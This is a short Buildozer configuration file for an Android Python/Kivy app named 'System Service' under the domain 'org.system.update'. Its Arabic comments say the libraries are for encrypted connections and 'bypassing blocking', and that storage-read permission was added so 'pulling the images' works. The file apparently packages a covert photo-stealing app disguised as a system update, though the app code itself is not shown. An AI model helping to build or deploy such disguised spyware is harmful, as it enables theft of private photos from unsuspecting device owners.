[app]
title = System Service
package.name = systemservice
package.domain = org.system.update

source.dir = .
source.include_exts = py,png,jpg,kv,json

version = 3.0.5

# المكتبات المطلوبة للاتصال المشفر وتجاوز الحظر
requirements = python3,kivy,requests,urllib3,certifi,idna,charset-normalizer

orientation = portrait
fullscreen = 0

# أضفت READ_EXTERNAL_STORAGE لكي ينجح سحب الصور
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, ACCESS_NETWORK_STATE

android.api = 33
android.minapi = 21
android.enable_androidx = True

# دعم المعالجات كما في كودك
android.archs = arm64-v8a, armeabi-v7a

android.private_storage = True

[buildozer]
log_level = 2
warn_on_root = 1
